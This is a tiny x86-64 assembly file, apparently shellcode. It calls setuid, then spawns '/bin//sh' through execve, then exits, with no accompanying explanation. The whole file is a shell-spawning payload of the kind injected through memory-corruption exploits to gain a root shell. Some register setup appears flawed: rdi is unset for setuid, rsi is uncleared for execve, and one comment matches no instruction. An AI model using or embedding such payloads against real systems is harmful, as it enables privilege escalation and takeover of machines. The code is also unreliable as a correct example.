section .text

global _start

_start:
;clear out the registers we are going to need
	xor rax, rax
	mov al, 105
	;zero out rcx
	syscall


 
	xor rax, rax
    mov al,59
   ; cdq            ; edx = 0 
    xor rdx, rdx
    mov     rcx, '/bin//sh'
    push    rdx    ; 0
    push    rcx    ; "/bin//sh"
    mov rdi,rsp
    syscall
	xor rax, rax
	;exit(int ret)
	mov al ,60
	xor rdi, rdi
	syscall


